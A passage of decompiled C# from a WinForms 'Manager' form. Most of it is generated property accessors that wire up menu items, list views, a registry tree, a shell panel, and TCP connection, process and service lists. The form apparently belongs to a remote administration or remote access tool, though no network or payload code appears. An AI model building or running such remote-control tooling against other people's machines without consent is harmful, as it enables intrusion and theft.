		internal virtual ToolStripMenuItem NewFolderToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NewFolderToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NewFolderToolStripMenuItem_Click);
				bool flag = this._NewFolderToolStripMenuItem != null;
				if (flag)
				{
					this._NewFolderToolStripMenuItem.Click -= value2;
				}
				this._NewFolderToolStripMenuItem = value;
				flag = (this._NewFolderToolStripMenuItem != null);
				if (flag)
				{
					this._NewFolderToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000B0 RID: 176
		// (get) Token: 0x06000201 RID: 513 RVA: 0x001ECBA8 File Offset: 0x001EAFA8
		// (set) Token: 0x06000202 RID: 514 RVA: 0x001ECBC0 File Offset: 0x001EAFC0
		internal virtual ToolStripMenuItem OpenDownloadsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenDownloadsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.OpenDownloadsToolStripMenuItem_Click);
				bool flag = this._OpenDownloadsToolStripMenuItem != null;
				if (flag)
				{
					this._OpenDownloadsToolStripMenuItem.Click -= value2;
				}
				this._OpenDownloadsToolStripMenuItem = value;
				flag = (this._OpenDownloadsToolStripMenuItem != null);
				if (flag)
				{
					this._OpenDownloadsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000B1 RID: 177
		// (get) Token: 0x06000203 RID: 515 RVA: 0x001ECC20 File Offset: 0x001EB020
		// (set) Token: 0x06000204 RID: 516 RVA: 0x001ECC38 File Offset: 0x001EB038
		internal virtual ToolStripMenuItem RarToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RarToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RarToolStripMenuItem_Click);
				bool flag = this._RarToolStripMenuItem != null;
				if (flag)
				{
					this._RarToolStripMenuItem.Click -= value2;
				}
				this._RarToolStripMenuItem = value;
				flag = (this._RarToolStripMenuItem != null);
				if (flag)
				{
					this._RarToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000B2 RID: 178
		// (get) Token: 0x06000205 RID: 517 RVA: 0x001ECC98 File Offset: 0x001EB098
		// (set) Token: 0x06000206 RID: 518 RVA: 0x001ECCB0 File Offset: 0x001EB0B0
		internal virtual ToolStripMenuItem UnRarToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UnRarToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UnRarToolStripMenuItem_Click);
				bool flag = this._UnRarToolStripMenuItem != null;
				if (flag)
				{
					this._UnRarToolStripMenuItem.Click -= value2;
				}
				this._UnRarToolStripMenuItem = value;
				flag = (this._UnRarToolStripMenuItem != null);
				if (flag)
				{
					this._UnRarToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000B3 RID: 179
		// (get) Token: 0x06000207 RID: 519 RVA: 0x001ECD10 File Offset: 0x001EB110
		// (set) Token: 0x06000208 RID: 520 RVA: 0x001ECD28 File Offset: 0x001EB128
		internal virtual ToolStripMenuItem UploadFromLinkToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UploadFromLinkToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UploadFromLinkToolStripMenuItem_Click);
				bool flag = this._UploadFromLinkToolStripMenuItem != null;
				if (flag)
				{
					this._UploadFromLinkToolStripMenuItem.Click -= value2;
				}
				this._UploadFromLinkToolStripMenuItem = value;
				flag = (this._UploadFromLinkToolStripMenuItem != null);
				if (flag)
				{
					this._UploadFromLinkToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000B4 RID: 180
		// (get) Token: 0x06000209 RID: 521 RVA: 0x001ECD88 File Offset: 0x001EB188
		// (set) Token: 0x0600020A RID: 522 RVA: 0x001ECDA0 File Offset: 0x001EB1A0
		internal virtual ContextMenuStrip ContextMenuStrip4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip4 = value;
			}
		}

		// Token: 0x170000B5 RID: 181
		// (get) Token: 0x0600020B RID: 523 RVA: 0x001ECDAC File Offset: 0x001EB1AC
		// (set) Token: 0x0600020C RID: 524 RVA: 0x001ECDC4 File Offset: 0x001EB1C4
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem3_Click);
				bool flag = this._RefreshToolStripMenuItem3 != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem3.Click -= value2;
				}
				this._RefreshToolStripMenuItem3 = value;
				flag = (this._RefreshToolStripMenuItem3 != null);
				if (flag)
				{
					this._RefreshToolStripMenuItem3.Click += value2;
				}
			}
		}

		// Token: 0x170000B6 RID: 182
		// (get) Token: 0x0600020D RID: 525 RVA: 0x001ECE24 File Offset: 0x001EB224
		// (set) Token: 0x0600020E RID: 526 RVA: 0x001ECE3C File Offset: 0x001EB23C
		internal virtual ImageList MG
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MG;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MG = value;
			}
		}

		// Token: 0x170000B7 RID: 183
		// (get) Token: 0x0600020F RID: 527 RVA: 0x001ECE48 File Offset: 0x001EB248
		// (set) Token: 0x06000210 RID: 528 RVA: 0x001ECE60 File Offset: 0x001EB260
		internal virtual ListView ListView1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ListView1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ListView1_SelectedIndexChanged);
				bool flag = this._ListView1 != null;
				if (flag)
				{
					this._ListView1.SelectedIndexChanged -= value2;
				}
				this._ListView1 = value;
				flag = (this._ListView1 != null);
				if (flag)
				{
					this._ListView1.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x170000B8 RID: 184
		// (get) Token: 0x06000211 RID: 529 RVA: 0x001ECEC0 File Offset: 0x001EB2C0
		// (set) Token: 0x06000212 RID: 530 RVA: 0x001ECED8 File Offset: 0x001EB2D8
		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		// Token: 0x170000B9 RID: 185
		// (get) Token: 0x06000213 RID: 531 RVA: 0x001ECEE4 File Offset: 0x001EB2E4
		// (set) Token: 0x06000214 RID: 532 RVA: 0x001ECEFC File Offset: 0x001EB2FC
		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		// Token: 0x170000BA RID: 186
		// (get) Token: 0x06000215 RID: 533 RVA: 0x001ECF08 File Offset: 0x001EB308
		// (set) Token: 0x06000216 RID: 534 RVA: 0x001ECF20 File Offset: 0x001EB320
		internal virtual ImageList vmethod_148
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_148;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._vmethod_148 = value;
			}
		}

		// Token: 0x170000BB RID: 187
		// (get) Token: 0x06000217 RID: 535 RVA: 0x001ECF2C File Offset: 0x001EB32C
		// (set) Token: 0x06000218 RID: 536 RVA: 0x001ECF44 File Offset: 0x001EB344
		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Timer1 = value;
			}
		}

		// Token: 0x170000BC RID: 188
		// (get) Token: 0x06000219 RID: 537 RVA: 0x001ECF50 File Offset: 0x001EB350
		// (set) Token: 0x0600021A RID: 538 RVA: 0x001ECF68 File Offset: 0x001EB368
		internal virtual Panel FMM
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FMM;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._FMM = value;
			}
		}

		// Token: 0x170000BD RID: 189
		// (get) Token: 0x0600021B RID: 539 RVA: 0x001ECF74 File Offset: 0x001EB374
		// (set) Token: 0x0600021C RID: 540 RVA: 0x001ECF8C File Offset: 0x001EB38C
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x170000BE RID: 190
		// (get) Token: 0x0600021D RID: 541 RVA: 0x001ECF98 File Offset: 0x001EB398
		// (set) Token: 0x0600021E RID: 542 RVA: 0x001ECFB0 File Offset: 0x001EB3B0
		internal virtual GClass9 L1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.L1_DoubleClick1);
				bool flag = this._L1 != null;
				if (flag)
				{
					this._L1.DoubleClick -= value2;
				}
				this._L1 = value;
				flag = (this._L1 != null);
				if (flag)
				{
					this._L1.DoubleClick += value2;
				}
			}
		}

		// Token: 0x170000BF RID: 191
		// (get) Token: 0x0600021F RID: 543 RVA: 0x001ED010 File Offset: 0x001EB410
		// (set) Token: 0x06000220 RID: 544 RVA: 0x001ED028 File Offset: 0x001EB428
		internal virtual ColumnHeader ColumnHeader6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader6 = value;
			}
		}

		// Token: 0x170000C0 RID: 192
		// (get) Token: 0x06000221 RID: 545 RVA: 0x001ED034 File Offset: 0x001EB434
		// (set) Token: 0x06000222 RID: 546 RVA: 0x001ED04C File Offset: 0x001EB44C
		internal virtual ColumnHeader ColumnHeader7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader7 = value;
			}
		}

		// Token: 0x170000C1 RID: 193
		// (get) Token: 0x06000223 RID: 547 RVA: 0x001ED058 File Offset: 0x001EB458
		// (set) Token: 0x06000224 RID: 548 RVA: 0x001ED070 File Offset: 0x001EB470
		internal virtual PictureBox p
		{
			[DebuggerNonUserCode]
			get
			{
				return this._p;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._p = value;
			}
		}

		// Token: 0x170000C2 RID: 194
		// (get) Token: 0x06000225 RID: 549 RVA: 0x001ED07C File Offset: 0x001EB47C
		// (set) Token: 0x06000226 RID: 550 RVA: 0x001ED094 File Offset: 0x001EB494
		internal virtual GClass9 L2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.L2_SelectedIndexChanged);
				EventHandler value3 = new EventHandler(this.L2_DoubleClick);
				bool flag = this._L2 != null;
				if (flag)
				{
					this._L2.SelectedIndexChanged -= value2;
					this._L2.DoubleClick -= value3;
				}
				this._L2 = value;
				flag = (this._L2 != null);
				if (flag)
				{
					this._L2.SelectedIndexChanged += value2;
					this._L2.DoubleClick += value3;
				}
			}
		}

		// Token: 0x170000C3 RID: 195
		// (get) Token: 0x06000227 RID: 551 RVA: 0x001ED11C File Offset: 0x001EB51C
		// (set) Token: 0x06000228 RID: 552 RVA: 0x001ED134 File Offset: 0x001EB534
		internal virtual ColumnHeader ColumnHeader8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader8 = value;
			}
		}

		// Token: 0x170000C4 RID: 196
		// (get) Token: 0x06000229 RID: 553 RVA: 0x001ED140 File Offset: 0x001EB540
		// (set) Token: 0x0600022A RID: 554 RVA: 0x001ED158 File Offset: 0x001EB558
		internal virtual ColumnHeader ColumnHeader9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader9 = value;
			}
		}

		// Token: 0x170000C5 RID: 197
		// (get) Token: 0x0600022B RID: 555 RVA: 0x001ED164 File Offset: 0x001EB564
		// (set) Token: 0x0600022C RID: 556 RVA: 0x001ED17C File Offset: 0x001EB57C
		internal virtual ColumnHeader ColumnHeader10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader10 = value;
			}
		}

		// Token: 0x170000C6 RID: 198
		// (get) Token: 0x0600022D RID: 557 RVA: 0x001ED188 File Offset: 0x001EB588
		// (set) Token: 0x0600022E RID: 558 RVA: 0x001ED1A0 File Offset: 0x001EB5A0
		internal virtual GClass9 LTCP
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LTCP;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LTCP = value;
			}
		}

		// Token: 0x170000C7 RID: 199
		// (get) Token: 0x0600022F RID: 559 RVA: 0x001ED1AC File Offset: 0x001EB5AC
		// (set) Token: 0x06000230 RID: 560 RVA: 0x001ED1C4 File Offset: 0x001EB5C4
		internal virtual ColumnHeader ColumnHeader16
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader16;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader16 = value;
			}
		}

		// Token: 0x170000C8 RID: 200
		// (get) Token: 0x06000231 RID: 561 RVA: 0x001ED1D0 File Offset: 0x001EB5D0
		// (set) Token: 0x06000232 RID: 562 RVA: 0x001ED1E8 File Offset: 0x001EB5E8
		internal virtual ColumnHeader ColumnHeader17
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader17;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader17 = value;
			}
		}

		// Token: 0x170000C9 RID: 201
		// (get) Token: 0x06000233 RID: 563 RVA: 0x001ED1F4 File Offset: 0x001EB5F4
		// (set) Token: 0x06000234 RID: 564 RVA: 0x001ED20C File Offset: 0x001EB60C
		internal virtual ColumnHeader ColumnHeader18
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader18;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader18 = value;
			}
		}

		// Token: 0x170000CA RID: 202
		// (get) Token: 0x06000235 RID: 565 RVA: 0x001ED218 File Offset: 0x001EB618
		// (set) Token: 0x06000236 RID: 566 RVA: 0x001ED230 File Offset: 0x001EB630
		internal virtual ColumnHeader ColumnHeader19
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader19;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader19 = value;
			}
		}

		// Token: 0x170000CB RID: 203
		// (get) Token: 0x06000237 RID: 567 RVA: 0x001ED23C File Offset: 0x001EB63C
		// (set) Token: 0x06000238 RID: 568 RVA: 0x001ED254 File Offset: 0x001EB654
		internal virtual ColumnHeader ColumnHeader20
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader20;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader20 = value;
			}
		}

		// Token: 0x170000CC RID: 204
		// (get) Token: 0x06000239 RID: 569 RVA: 0x001ED260 File Offset: 0x001EB660
		// (set) Token: 0x0600023A RID: 570 RVA: 0x001ED278 File Offset: 0x001EB678
		internal virtual ColumnHeader ColumnHeader21
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader21;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader21 = value;
			}
		}

		// Token: 0x170000CD RID: 205
		// (get) Token: 0x0600023B RID: 571 RVA: 0x001ED284 File Offset: 0x001EB684
		// (set) Token: 0x0600023C RID: 572 RVA: 0x001ED29C File Offset: 0x001EB69C
		internal virtual Panel RG
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RG;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RG = value;
			}
		}

		// Token: 0x170000CE RID: 206
		// (get) Token: 0x0600023D RID: 573 RVA: 0x001ED2A8 File Offset: 0x001EB6A8
		// (set) Token: 0x0600023E RID: 574 RVA: 0x001ED2C0 File Offset: 0x001EB6C0
		internal virtual GClass9 RGLIST
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RGLIST;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RGLIST_DoubleClick);
				bool flag = this._RGLIST != null;
				if (flag)
				{
					this._RGLIST.DoubleClick -= value2;
				}
				this._RGLIST = value;
				flag = (this._RGLIST != null);
				if (flag)
				{
					this._RGLIST.DoubleClick += value2;
				}
			}
		}

		// Token: 0x170000CF RID: 207
		// (get) Token: 0x0600023F RID: 575 RVA: 0x001ED320 File Offset: 0x001EB720
		// (set) Token: 0x06000240 RID: 576 RVA: 0x001ED338 File Offset: 0x001EB738
		internal virtual ColumnHeader ColumnHeader3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader3 = value;
			}
		}

		// Token: 0x170000D0 RID: 208
		// (get) Token: 0x06000241 RID: 577 RVA: 0x001ED344 File Offset: 0x001EB744
		// (set) Token: 0x06000242 RID: 578 RVA: 0x001ED35C File Offset: 0x001EB75C
		internal virtual ColumnHeader ColumnHeader4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader4 = value;
			}
		}

		// Token: 0x170000D1 RID: 209
		// (get) Token: 0x06000243 RID: 579 RVA: 0x001ED368 File Offset: 0x001EB768
		// (set) Token: 0x06000244 RID: 580 RVA: 0x001ED380 File Offset: 0x001EB780
		internal virtual ColumnHeader ColumnHeader5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader5 = value;
			}
		}

		// Token: 0x170000D2 RID: 210
		// (get) Token: 0x06000245 RID: 581 RVA: 0x001ED38C File Offset: 0x001EB78C
		// (set) Token: 0x06000246 RID: 582 RVA: 0x001ED3A4 File Offset: 0x001EB7A4
		internal virtual TreeView RGk
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RGk;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				TreeNodeMouseClickEventHandler value2 = new TreeNodeMouseClickEventHandler(this.RGk_NodeMouseClick);
				TreeViewEventHandler value3 = new TreeViewEventHandler(this.RGk_AfterSelect);
				TreeViewEventHandler value4 = new TreeViewEventHandler(this.RGk_AfterExpand);
				TreeViewEventHandler value5 = new TreeViewEventHandler(this.RGk_AfterCollapse);
				bool flag = this._RGk != null;
				if (flag)
				{
					this._RGk.NodeMouseDoubleClick -= value2;
					this._RGk.AfterSelect -= value3;
					this._RGk.AfterExpand -= value4;
					this._RGk.AfterCollapse -= value5;
				}
				this._RGk = value;
				flag = (this._RGk != null);
				if (flag)
				{
					this._RGk.NodeMouseDoubleClick += value2;
					this._RGk.AfterSelect += value3;
					this._RGk.AfterExpand += value4;
					this._RGk.AfterCollapse += value5;
				}
			}
		}

		// Token: 0x170000D3 RID: 211
		// (get) Token: 0x06000247 RID: 583 RVA: 0x001ED480 File Offset: 0x001EB880
		// (set) Token: 0x06000248 RID: 584 RVA: 0x001ED498 File Offset: 0x001EB898
		internal virtual Panel sh
		{
			[DebuggerNonUserCode]
			get
			{
				return this._sh;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.sh_Resize);
				bool flag = this._sh != null;
				if (flag)
				{
					this._sh.Resize -= value2;
				}
				this._sh = value;
				flag = (this._sh != null);
				if (flag)
				{
					this._sh.Resize += value2;
				}
			}
		}

		// Token: 0x170000D4 RID: 212
		// (get) Token: 0x06000249 RID: 585 RVA: 0x001ED4F8 File Offset: 0x001EB8F8
		// (set) Token: 0x0600024A RID: 586 RVA: 0x001ED510 File Offset: 0x001EB910
		internal virtual RichTextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._T1 = value;
			}
		}

		// Token: 0x170000D5 RID: 213
		// (get) Token: 0x0600024B RID: 587 RVA: 0x001ED51C File Offset: 0x001EB91C
		// (set) Token: 0x0600024C RID: 588 RVA: 0x001ED534 File Offset: 0x001EB934
		internal virtual TextBox T2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyEventHandler value2 = new KeyEventHandler(this.T2_KeyDown);
				bool flag = this._T2 != null;
				if (flag)
				{
					this._T2.KeyDown -= value2;
				}
				this._T2 = value;
				flag = (this._T2 != null);
				if (flag)
				{
					this._T2.KeyDown += value2;
				}
			}
		}

		// Token: 0x170000D6 RID: 214
		// (get) Token: 0x0600024D RID: 589 RVA: 0x001ED594 File Offset: 0x001EB994
		// (set) Token: 0x0600024E RID: 590 RVA: 0x001ED5AC File Offset: 0x001EB9AC
		internal virtual GClass9 LPR
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LPR;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LPR = value;
			}
		}

		// Token: 0x170000D7 RID: 215
		// (get) Token: 0x0600024F RID: 591 RVA: 0x001ED5B8 File Offset: 0x001EB9B8
		// (set) Token: 0x06000250 RID: 592 RVA: 0x001ED5D0 File Offset: 0x001EB9D0
		internal virtual ColumnHeader ColumnHeader22
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader22;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader22 = value;
			}
		}

		// Token: 0x170000D8 RID: 216
		// (get) Token: 0x06000251 RID: 593 RVA: 0x001ED5DC File Offset: 0x001EB9DC
		// (set) Token: 0x06000252 RID: 594 RVA: 0x001ED5F4 File Offset: 0x001EB9F4
		internal virtual ColumnHeader ColumnHeader23
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader23;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader23 = value;
			}
		}

		// Token: 0x170000D9 RID: 217
		// (get) Token: 0x06000253 RID: 595 RVA: 0x001ED600 File Offset: 0x001EBA00
		// (set) Token: 0x06000254 RID: 596 RVA: 0x001ED618 File Offset: 0x001EBA18
		internal virtual ColumnHeader ColumnHeader24
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader24;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader24 = value;
			}
		}

		// Token: 0x170000DA RID: 218
		// (get) Token: 0x06000255 RID: 597 RVA: 0x001ED624 File Offset: 0x001EBA24
		// (set) Token: 0x06000256 RID: 598 RVA: 0x001ED63C File Offset: 0x001EBA3C
		internal virtual ColumnHeader ColumnHeader25
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader25;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader25 = value;
			}
		}

		// Token: 0x170000DB RID: 219
		// (get) Token: 0x06000257 RID: 599 RVA: 0x001ED648 File Offset: 0x001EBA48
		// (set) Token: 0x06000258 RID: 600 RVA: 0x001ED660 File Offset: 0x001EBA60
		internal virtual ColumnHeader ColumnHeader26
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader26;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader26 = value;
			}
		}

		// Token: 0x170000DC RID: 220
		// (get) Token: 0x06000259 RID: 601 RVA: 0x001ED66C File Offset: 0x001EBA6C
		// (set) Token: 0x0600025A RID: 602 RVA: 0x001ED684 File Offset: 0x001EBA84
		internal virtual GClass9 LSRV
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LSRV;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LSRV = value;
			}
		}

		// Token: 0x170000DD RID: 221
		// (get) Token: 0x0600025B RID: 603 RVA: 0x001ED690 File Offset: 0x001EBA90
		// (set) Token: 0x0600025C RID: 604 RVA: 0x001ED6A8 File Offset: 0x001EBAA8
		internal virtual ColumnHeader ColumnHeader11
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader11;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader11 = value;
			}
		}

		// Token: 0x170000DE RID: 222
		// (get) Token: 0x0600025D RID: 605 RVA: 0x001ED6B4 File Offset: 0x001EBAB4
		// (set) Token: 0x0600025E RID: 606 RVA: 0x001ED6CC File Offset: 0x001EBACC
		internal virtual ColumnHeader ColumnHeader12
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader12;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader12 = value;
			}
		}

		// Token: 0x170000DF RID: 223
		// (get) Token: 0x0600025F RID: 607 RVA: 0x001ED6D8 File Offset: 0x001EBAD8
		// (set) Token: 0x06000260 RID: 608 RVA: 0x001ED6F0 File Offset: 0x001EBAF0
		internal virtual ColumnHeader ColumnHeader13
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader13;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader13 = value;
			}
		}

		// Token: 0x170000E0 RID: 224
		// (get) Token: 0x06000261 RID: 609 RVA: 0x001ED6FC File Offset: 0x001EBAFC
		// (set) Token: 0x06000262 RID: 610 RVA: 0x001ED714 File Offset: 0x001EBB14
		internal virtual ColumnHeader ColumnHeader14
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader14;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader14 = value;
			}
		}

		// Token: 0x170000E1 RID: 225
		// (get) Token: 0x06000263 RID: 611 RVA: 0x001ED720 File Offset: 0x001EBB20
		// (set) Token: 0x06000264 RID: 612 RVA: 0x001ED738 File Offset: 0x001EBB38
		internal virtual ColumnHeader ColumnHeader15
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader15;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader15 = value;
			}
		}

		// Token: 0x170000E2 RID: 226
		// (get) Token: 0x06000265 RID: 613 RVA: 0x001ED744 File Offset: 0x001EBB44
		// (set) Token: 0x06000266 RID: 614 RVA: 0x001ED75C File Offset: 0x001EBB5C
		internal virtual ImageList vmethod_108
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_108;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._vmethod_108 = value;
			}
		}

		// Token: 0x06000267 RID: 615 RVA: 0x001ED768 File Offset: 0x001EBB68
		public Manager()
		{
			base.Load += this.Manager_Load;
			base.Resize += this.Manager_Resize;
			base.FormClosing += this.Manager_FormClosing;
			Manager.__ENCAddToList(this);
			this.RGCH = new Collection();
			this.string_0 = string.Empty;
			this.Images = new Collection();
			this.Cache = new Collection();
			this.isCut = false;
			this.Flist = string.Empty;
			this.TCPFX = true;
			this.PRFX = true;
			this.SrvFX = true;
			this.srvNxt = true;
			this.PID = 0;
			this.PRNXT = true;
			this.TCPNXT = true;
